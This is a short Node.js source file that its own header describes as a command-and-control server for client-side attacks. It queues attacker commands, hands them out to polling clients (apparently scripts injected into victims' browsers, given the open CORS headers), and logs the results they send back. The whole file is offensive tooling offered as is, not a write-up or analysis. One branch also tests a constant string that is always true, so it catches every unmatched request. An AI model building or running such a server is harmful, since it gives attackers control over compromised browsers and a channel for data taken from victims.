/*
 * Simple client side attacks NodeJS command and control server
 *
*/

var http = require('http');
var url = require('url');
var Buffer = require('buffer').Buffer;
var commandQueue = [];
var commandId = 0;

http.createServer(function (request, response) {
	response.statusCode = 200;
	
	response.setHeader("Access-Control-Allow-Origin","*");
	response.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
	response.setHeader("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Cookie");
	
	if(request.method === 'OPTIONS'){
		response.end('');
		return;
	}
	var chunks = [];
	
	request.addListener('data', function (chunk) { chunks.push(chunk); });
	request.addListener('end', function () {
		request.body = Buffer.concat(chunks);
		
		var parsedUrl = url.parse(request.url,true);
		if("getCommand" in parsedUrl.query && commandQueue.length !== 0) {
			var cmdObj = commandQueue.shift();
			cmdObj.id = commandId++;
			response.end(JSON.stringify(cmdObj));
			console.log("Sending command " + cmdObj.id);
		}else if("getCommand" in parsedUrl.query) {
			response.end(JSON.stringify(undefined));
		}else if("commandResult" in parsedUrl.query) {
			console.log(parsedUrl.query.cmdid + ": " + request.body);
			response.end('');
		}else if ("registerCommand") {
			commandQueue.push(JSON.parse(request.body));
			response.end('');
		}else {
			response.end('');
		}
	});
	
}).listen(8090, function(){
	
	
});